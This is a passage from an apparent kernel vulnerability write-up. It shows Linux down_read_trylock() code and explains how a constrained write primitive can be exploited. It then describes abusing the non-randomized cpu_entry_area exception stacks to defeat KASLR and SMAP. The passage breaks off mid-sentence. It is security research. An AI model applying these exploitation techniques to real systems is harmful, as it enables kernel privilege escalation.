font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;long&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;tmp&lt;/span&gt;&lt;span style=\"color: #616161; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;DEBUG_RWSEMS_WARN_ON&lt;/span&gt;&lt;span style=\"color: #616161; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;sem-&lt;/span&gt;&lt;span style=\"color: #616161; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;gt;&lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;magic&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;!&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;sem,&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;sem&lt;/span&gt;&lt;span style=\"color: #616161; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;tmp&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;atomic_long_read&lt;/span&gt;&lt;span style=\"color: #616161; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;amp;&lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;sem-&lt;/span&gt;&lt;span style=\"color: #616161; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;gt;&lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;count&lt;/span&gt;&lt;span style=\"color: #616161; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"color: #9c27b0; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;while&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: #616161; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;!&lt;/span&gt;&lt;span style=\"color: #616161; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;tmp&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;amp;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;RWSEM_READ_FAILED_MASK&lt;/span&gt;&lt;span style=\"color: #616161; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;))&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: #616161; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"color: #9c27b0; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;if&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: #616161; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;atomic_long_try_cmpxchg_acquire&lt;/span&gt;&lt;span style=\"color: #616161; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;amp;&lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;sem-&lt;/span&gt;&lt;span style=\"color: #616161; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;gt;&lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;count,&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;amp;&lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;tmp,&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;tmp&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;+&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;RWSEM_READER_BIAS&lt;/span&gt;&lt;span style=\"color: #616161; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;))&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: #616161; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;rwsem_set_reader_owned&lt;/span&gt;&lt;span style=\"color: #616161; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"color: #0055aa; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;sem&lt;/span&gt;&lt;span style=\"color: #616161; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"color: #9c27b0; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;return&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: #f57d02; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;1&lt;/span&gt;&lt;span style=\"color: #616161; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"color: #616161; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"color: #616161; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"color: #9c27b0; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;return&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"color: #f57d02; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0&lt;/span&gt;&lt;span style=\"color: #616161; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"color: #616161; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;It was helpful to emulate the &lt;/span&gt;&lt;span style=\"background-color: #ea9999; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;down_read_trylock()&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; in unicorn to determine how it behaves when given different &lt;/span&gt;&lt;span style=\"background-color: #b4a7d6; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;sem-&amp;gt;count&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; values. Assuming this code is operating on inert and unchanging memory, it will increment &lt;/span&gt;&lt;span style=\"background-color: #b4a7d6; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;sem-&amp;gt;count&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; by 0x100 if the 3 least significant bits and the most significant bit are all unset. That means it is difficult to modify a kernel pointer and we cannot modify any non 8-byte aligned values (as they’ll have one or more of the bottom three bits set). Additionally, this semaphore is later unlocked, causing whatever write we perform to be reverted in the imminent future. Furthermore, at this point we don’t have an established strategy for determining the KASLR slide nor figuring out the addresses of any objects we might want to overwrite with our newfound primitive. It turns out that regardless of any randomization the kernel presently has in place, there’s a straightforward strategy for exploiting this bug even given such a constrained arbitrary write.&lt;/span&gt;&lt;/p&gt;&lt;h2 dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;\"&gt;Stack corruption…&lt;/span&gt;&lt;/h2&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;On x86-64 Linux, when the CPU performs certain interrupts and exceptions, it will swap to a respective stack that is mapped to a static and non-randomized virtual address, with a different stack for the different exception types. A brief documentation of those stacks and their parent structure, the &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;cpu_entry_area&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;, can be found &lt;/span&gt;&lt;a href=\"https://docs.kernel.org/x86/pti.html\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;here.&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; These stacks are most often used on entry into the kernel from userland, but they’re used for exceptions that happen in kernel mode as well. We’ve recently seen &lt;/span&gt;&lt;a href=\"https://google.github.io/kctf/vrp.html\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;KCTF&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; entries where attackers take advantage of the non-randomized &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;cpu_entry_area&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; stacks in order to access data at a known virtual address in kernel accessible memory even in the presence of SMAP and KASLR. You could also use these stacks to forge attacker-controlled data at a known kernel virtual address. This works because the attacker task’s general purpose register contents are 